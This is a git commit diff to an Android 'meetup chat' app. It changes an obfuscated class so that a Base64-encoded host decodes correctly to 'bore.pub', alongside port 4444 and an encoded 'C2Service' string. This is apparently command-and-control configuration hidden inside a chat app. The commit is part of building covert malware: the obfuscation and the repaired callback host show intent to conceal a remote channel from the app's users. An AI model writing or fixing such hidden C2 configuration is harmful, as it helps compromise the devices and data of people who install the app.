f9c0e656209eefaa9ede11e0c7b6b6c74f34ce34
jddjduejf <danielaramide23@gmail.com>
2026-08-01 04:43:56 +0100

    Fix Base64: Ym9yZS5wdWI= = bore.pub

--- app/src/main/java/com/meetup/chat/c.java
+++ app/src/main/java/com/meetup/chat/c.java
@@ -1,7 +1,7 @@
 package com.meetup.chat;
 
 public class c {
-    public static String a = Decoder.decode("b3JlLnB1Yg==");   // bore.pub
+    public static String a = Decoder.decode("Ym9yZS5wdWI=");   // bore.pub
     public static int b = 4444;
     public static String c = Decoder.decode("QzJTZXJ2aWNl");   // C2Service
 }
